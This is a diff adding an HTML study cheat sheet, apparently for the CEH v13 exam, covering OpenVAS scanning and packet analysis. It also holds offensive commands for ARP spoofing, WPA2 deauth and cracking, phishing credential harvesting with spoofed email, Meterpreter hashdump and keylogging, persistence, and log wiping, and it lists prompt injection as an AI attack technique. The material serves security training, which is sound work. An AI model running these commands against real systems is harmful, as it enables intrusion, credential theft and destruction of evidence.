+      <p class="tip"><strong>Tips:</strong> File → Export Objects → HTTP to grab transferred files. Right-click any TCP packet → Follow TCP Stream to read full session in cleartext.</p>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot da"></span>ARP poisoning / MITM</div>
+      <div class="cb">echo 1 > /proc/sys/net/ipv4/ip_forward   # Enable IP forwarding
+arpspoof -i eth0 -t &lt;victim_ip&gt; &lt;gateway_ip&gt;
+arpspoof -i eth0 -t &lt;gateway_ip&gt; &lt;victim_ip&gt;
+
+# Detect ARP spoofing
+arpwatch -i eth0
+arp -a       # Look for duplicate MACs in ARP table</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot dc"></span>Aircrack-ng — full WPA2 workflow</div>
+    <div class="cb">airmon-ng check kill                # Kill interfering processes (NetworkManager etc.)
+airmon-ng start wlan0             # Enable monitor mode → creates wlan0mon
+airodump-ng wlan0mon              # Scan all APs — note target BSSID + channel
+airodump-ng -c &lt;ch&gt; --bssid &lt;AP_MAC&gt; -w capture wlan0mon   # Targeted capture
+aireplay-ng -0 5 -a &lt;AP_MAC&gt; -c &lt;Client_MAC&gt; wlan0mon      # Deauth → force handshake
+# ↑ Wait for "[WPA handshake: xx:xx:xx]" in airodump header
+aircrack-ng -w rockyou.txt -b &lt;AP_MAC&gt; capture-01.cap      # Crack with Aircrack-ng
+
+# Faster GPU cracking — convert to Hashcat format
+hcxpcapngtool -o capture.hc22000 capture-01.cap
+hashcat -m 22000 capture.hc22000 rockyou.txt
+
+# Cleanup
+airmon-ng stop wlan0mon
+service NetworkManager restart</div>
+  </div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot db"></span>SMB enumeration</div>
+      <div class="cb">smbclient -L \\&lt;target&gt; -U ""
+smbclient \\&lt;target&gt;\&lt;share&gt; -U &lt;user&gt;
+smbmap -H &lt;target&gt;
+enum4linux -a &lt;target&gt;
+crackmapexec smb &lt;target&gt;</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot dgr"></span>Pcap CLI analysis</div>
+      <div class="cb">tcpdump -r capture.pcap -nn
+tcpdump -r capture.pcap port 21 -A
+strings capture.pcap | grep -i password
+tcpdump -i eth0 -w live.pcap      # Live capture to file</div>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ OPENVAS -->
+<div id="p-openvas" class="panel">
+  <div class="sl">Installation &amp; startup (Kali)</div>
+  <div class="card">
+    <div class="ct"><span class="dot dg"></span>Setup commands</div>
+    <div class="cb">sudo apt update &amp;&amp; sudo apt install -y openvas
+sudo gvm-setup           # Downloads NVT feed (~10-20 min) — SAVE the admin password printed at end!
+sudo gvm-check-setup     # Verify all services are OK
+sudo gvm-start           # Start ospd-openvas + gvmd + gsad daemons
+sudo gvm-stop            # Stop all services
+
+# Web UI — open in browser and accept self-signed certificate
+https://127.0.0.1:9392
+
+# Reset a forgotten password
+sudo gvmd --user=admin --new-password=newpass
+
+# Update NVT / CVE feeds
+sudo greenbone-nvt-sync
+sudo greenbone-scapdata-sync</div>
+  </div>
+  <div class="div"></div>
+  <div class="sl">Scan workflow (web UI)</div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot db"></span>Step-by-step</div>
+      <p class="tip" style="margin-bottom:7px;"><strong>Step 1 — Create target:</strong> Configuration → Targets → New Target</p>
+      <table>
+        <tr><th>Field</th><th>Value</th></tr>
+        <tr><td>Hosts</td><td>IP address, range, or CIDR (e.g. 192.168.1.0/24)</td></tr>
+        <tr><td>Port list</td><td>All IANA assigned TCP (default)</td></tr>
+        <tr><td>Alive test</td><td>Set "Consider Alive" if target blocks ping</td></tr>
+        <tr><td>Credentials</td><td>Add SSH/SMB creds for authenticated scan</td></tr>
+      </table>
+      <p class="tip" style="margin-top:8px;"><strong>Step 2 — Create task:</strong> Scans → Tasks → New Task<br>Select target · Scanner = OpenVAS Default · Scan Config = Full and fast<br><strong>Step 3 — Run:</strong> Click the green Play button → monitor % progress bar<br><strong>Step 4 — Report:</strong> Scans → Reports → sort by Severity → export PDF / XML / CSV</p>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot da"></span>Scan configs &amp; severity</div>
+      <table>
+        <tr><th>Config</th><th>Speed</th><th>When to use</th></tr>
+        <tr><td>Discovery</td><td>Fast</td><td>Ports &amp; services only — no vuln checks</td></tr>
+        <tr><td>Full and fast</td><td>Medium</td><td>Default — safe checks, won't crash services</td></tr>
+        <tr><td>Full and deep</td><td>Slow</td><td>Thorough including unsafe checks</td></tr>
+        <tr><td>Host Discovery</td><td>Very fast</td><td>Live host enumeration only</td></tr>
+        <tr><td>System Discovery</td><td>Fast</td><td>OS + service asset inventory</td></tr>
+      </table>
+      <p class="tip" style="margin-top:8px;"><strong>CVSS severity bands:</strong><br>
+      Critical 9.0–10.0 · High 7.0–8.9 · Medium 4.0–6.9 · Low 0.1–3.9<br><br>
+      <strong>QoD</strong> = Quality of Detection %. Higher = more reliable result.<br>
+      Credentialed scans = 70–99% QoD · Uncredentialed = 30–70% QoD</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot dgr"></span>gvm-cli — command line</div>
+    <div class="cb">gvm-cli socket --xml "&lt;get_version/&gt;"                          # Check GVM version
+gvm-cli socket --xml "&lt;get_scanners/&gt;"                        # List scanners
+gvm-cli socket --xml "&lt;get_targets/&gt;"                         # List targets
+gvm-cli socket --xml "&lt;get_tasks/&gt;"                           # List all tasks
+gvm-cli socket --xml "&lt;start_task task_id='&lt;id&gt;'/&gt;"           # Start a task
+gvm-cli socket --xml "&lt;stop_task task_id='&lt;id&gt;'/&gt;"            # Stop a task
+gvm-cli socket --xml "&lt;get_reports/&gt;"                         # List reports</div>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot dr"></span>Exam question patterns</div>
+    <table>
+      <tr><th>Question type</th><th>What to do in the UI</th></tr>
+      <tr><td>Identify highest severity vuln</td><td>Sort report by CVSS descending → first row is the answer</td></tr>
+      <tr><td>Find specific CVE on a host</td><td>Filter report by host IP → search CVE column</td></tr>
+      <tr><td>Count critical vulnerabilities</td><td>Filter Severity = Critical in report filter bar</td></tr>
+      <tr><td>Which port is vulnerable</td><td>Click to expand vuln detail → check Port field</td></tr>
+      <tr><td>Patch / fix recommendation</td><td>Click vuln → read the Solution tab</td></tr>
+      <tr><td>Scanner shows "not connected"</td><td><span class="ic">sudo systemctl restart ospd-openvas</span></td></tr>
+      <tr><td>Scan stuck at 0%</td><td>Ping target to verify reachability; enable "Consider Alive" in target settings</td></tr>
+      <tr><td>UI not loading at :9392</td><td><span class="ic">sudo gvm-start</span> — wait 60s for gsad to bind</td></tr>
+    </table>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ AI IN CEHv13 -->
+<div id="p-ai" class="panel">
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dp"></span>AI-assisted attack techniques</div>
+      <table>
+        <tr><th>Technique</th><th>Description</th></tr>
+        <tr><td>AI phishing</td><td>LLM-generated spear-phishing emails; deepfake audio/video for vishing</td></tr>
+        <tr><td>AI malware</td><td>Polymorphic/metamorphic code; ML-based AV signature evasion</td></tr>
+        <tr><td>AI fuzzing</td><td>Intelligent fuzzing that prioritises crash-worthy inputs</td></tr>
+        <tr><td>Adversarial ML</td><td>Poison training data; craft inputs to fool IDS/ML-based defenses</td></tr>
+        <tr><td>AI OSINT</td><td>Maltego + AI to auto-correlate and enrich target data</td></tr>
+        <tr><td>Prompt injection</td><td>Manipulate LLM prompts to bypass safety filters or exfil data</td></tr>
+        <tr><td>Model poisoning</td><td>Inject malicious training data to corrupt ML models</td></tr>
+        <tr><td>Deepfake social eng</td><td>Synthesised audio/video for CEO fraud, vishing, impersonation</td></tr>
+      </table>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot dg"></span>AI-based defenses (exam awareness)</div>
+      <table>
+        <tr><th>Defense</th><th>How it works</th></tr>
+        <tr><td>AI-powered IDS</td><td>ML anomaly detection — harder to evade than signature-based</td></tr>
+        <tr><td>UEBA</td><td>User/Entity Behaviour Analytics flags deviations from baseline</td></tr>
+        <tr><td>AI SIEM</td><td>Correlates events at scale, dramatically reduces alert fatigue</td></tr>
+        <tr><td>Deception tech</td><td>Adaptive honeypots that react to attacker behaviour in real-time</td></tr>
+        <tr><td>AI anti-phishing</td><td>NLP classifies email intent; deepfake detection models</td></tr>
+        <tr><td>Predictive threat hunt</td><td>AI correlates IOCs before breach occurs</td></tr>
+      </table>
+    </div>
+  </div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dr"></span>SET — AI-enhanced phishing</div>
+      <div class="cb">setoolkit
+# 1) Social Engineering Attacks
+# 2) Website Attack Vectors
+# 3) Credential Harvester Attack Method
+# 4) Site Cloner → enter target URL
+# Credentials captured in SET console output
+
+# Combine with spoofed email delivery:
+swaks --to victim@domain.com --from ceo@domain.com --server mail.domain.com</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot db"></span>AI-enhanced recon tools</div>
+      <div class="cb">theHarvester -d &lt;domain&gt; -b all    # OSINT aggregation
+maltego                             # Graph-based OSINT + AI plugins
+nuclei -u &lt;target&gt; -t /path/to/templates/  # AI-assisted templated scan
+recon-ng                            # Modular recon framework</div>
+      <p class="tip" style="margin-top:7px;"><strong>Key AI concepts to know for exam:</strong><br>
+      Prompt injection · Model poisoning · Deepfake social engineering ·
+      Adversarial inputs to fool ML-based WAF/IDS · WormGPT / FraudGPT (malicious LLMs) ·
+      Predictive threat hunting · AI-driven OSINT correlation</p>
+    </div>
+  </div>
+</div>
+
+<!-- ═══════════════════════════════════════════════════════ POST-EXPLOIT -->
+<div id="p-post" class="panel">
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dr"></span>Meterpreter commands</div>
+      <div class="cb">sysinfo              # System information
+getuid               # Current user context
+getsystem            # Attempt privilege escalation
+hashdump             # Dump SAM database hashes
+shell                # Drop to native OS shell
+upload &lt;file&gt;        # Upload file to target
+download &lt;file&gt;      # Download file from target
+keyscan_start        # Start keylogger
+keyscan_dump         # Dump captured keystrokes
+screenshot           # Take desktop screenshot
+run post/multi/recon/local_exploit_suggester
+run post/windows/gather/enum_logged_on_users</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot db"></span>Persistence techniques</div>
+      <div class="cb"># Windows — registry run key
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d C:\shell.exe
+
+# Windows — scheduled task
+schtasks /create /sc onlogon /tn "update" /tr C:\shell.exe /ru SYSTEM
+
+# Linux — cron job
+crontab -e
+# Add: @reboot /tmp/shell.sh
+
+# Linux — bashrc
+echo "/tmp/shell.sh" >> ~/.bashrc
+
+# MSF persistence module
+run post/windows/manage/persistence STARTUP=SCHEDULER</div>
+    </div>
+  </div>
+  <div class="r2">
+    <div class="card">
+      <div class="ct"><span class="dot dgr"></span>Log clearing (anti-forensics)</div>
+      <div class="cb"># Windows — clear event logs
+wevtutil cl System
+wevtutil cl Security
+wevtutil cl Application
+
+# Linux — clear logs
+echo > /var/log/auth.log
+echo > /var/log/syslog
+history -c &amp;&amp; history -w
+unset HISTFILE</div>
+    </div>
+    <div class="card">
+      <div class="ct"><span class="dot dg"></span>Steganography</div>
+      <div class="cb">steghide embed -cf image.jpg -sf secret.txt -p pass
+steghide extract -sf image.jpg -p pass
+stegdetect image.jpg           # Detect steganography
+binwalk image.jpg              # Detect embedded files
+exiftool image.jpg             # Check/edit metadata
+openstego                      # GUI stego tool</div>
+    </div>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot dp"></span>Forensics — memory &amp; pcap analysis</div>
+    <div class="cb"># Wireshark
+# File → Export Objects → HTTP (grab files transferred over HTTP)
+# Right-click any TCP packet → Follow TCP Stream (read cleartext session)
+
+# tcpdump CLI
+tcpdump -r capture.pcap -nn
+tcpdump -r capture.pcap port 21 -A     # Show FTP cleartext
+strings capture.pcap | grep -i password
+
+# Volatility — memory forensics
+volatility -f mem.raw imageinfo                                      # Identify profile
+volatility -f mem.raw --profile=&lt;profile&gt; pslist                   # Running processes
+volatility -f mem.raw --profile=&lt;profile&gt; hashdump                 # Extract hashes
+volatility -f mem.raw --profile=&lt;profile&gt; cmdline                  # Command history
+volatility -f mem.raw --profile=&lt;profile&gt; netscan                  # Network connections</div>
+  </div>
+  <div class="card">
+    <div class="ct"><span class="dot da"></span>Covering tracks — full checklist</div>
+    <table>
+      <tr><th>Action</th><th>Command / tool</th><th>Category</th></tr>
+      <tr><td>Clear bash history</td><td><span class="ic">history -c &amp;&amp; unset HISTFILE</span></td><td>Anti-forensics</td></tr>
+      <tr><td>Clear Windows event logs</td><td><span class="ic">wevtutil cl Security</span></td><td>Anti-forensics</td></tr>
+      <tr><td>Timestamp manipulation</td><td><span class="ic">touch -t &lt;timestamp&gt; file</span></td><td>Anti-forensics</td></tr>
+      <tr><td>Rootkit detection check</td><td><span class="ic">chkrootkit</span> / <span class="ic">rkhunter --check</span></td><td>Detection</td></tr>
+      <tr><td>Covert data exfil</td><td><span class="ic">steghide</span> / <span class="ic">openstego</span></td><td>Covert channel</td></tr>
+      <tr><td>Delete log files</td><td><span class="ic">shred -zu /var/log/auth.log</span></td><td>Anti-forensics</td></tr>
+      <tr><td>Remove uploaded files</td><td><span class="ic">rm -f /tmp/shell.elf</span></td><td>Clean-up</td></tr>
+    </table>
+  </div>
+</div>
+
+</div><!-- /.page -->
+
+<script>
+function sw(name, el) {
+  document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.getElementById('p-' + name).classList.add('active');
+  el.classList.add('active');
+  window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+</script>
+</body>
+</html>
